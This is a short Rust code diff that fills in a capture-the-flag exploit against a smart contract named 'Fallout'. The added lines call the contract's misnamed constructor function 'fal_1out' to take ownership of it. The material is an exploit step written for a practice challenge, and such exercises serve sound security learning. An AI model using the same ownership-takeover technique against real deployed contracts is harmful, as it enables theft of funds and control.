@@ -18,6 +18,10 @@ impl ctf::Exploit for Exploit {
         target: &Self::Target,
         offender: &ctf::Actor,
     ) -> eyre::Result<()> {
+        let contract = Fallout::new(target.address, offender.clone());
+
+        contract.fal_1out().send().await?.await?;
+
         Ok(())
     }
 }
